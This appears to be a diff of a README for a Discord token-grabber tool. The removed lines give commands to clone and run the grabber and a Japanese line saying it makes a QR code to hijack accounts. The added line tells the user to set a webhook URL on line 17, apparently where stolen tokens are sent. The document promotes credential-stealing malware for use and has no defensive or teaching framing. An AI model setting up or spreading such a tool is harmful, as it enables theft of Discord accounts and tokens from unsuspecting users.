@@ -1,8 +1,1 @@
-# discord token grabber
-
-```
-git clone https://github.com/agehantonu/token-grabber.git
-cd token-grabber
-python VX-grabber.py
-```
-qrを作成してアカウントを乗っ取ります
+17行目のと```        private static readonly string WebhookUrl = "YOUR_WEBHOOK_URL_HERE";```
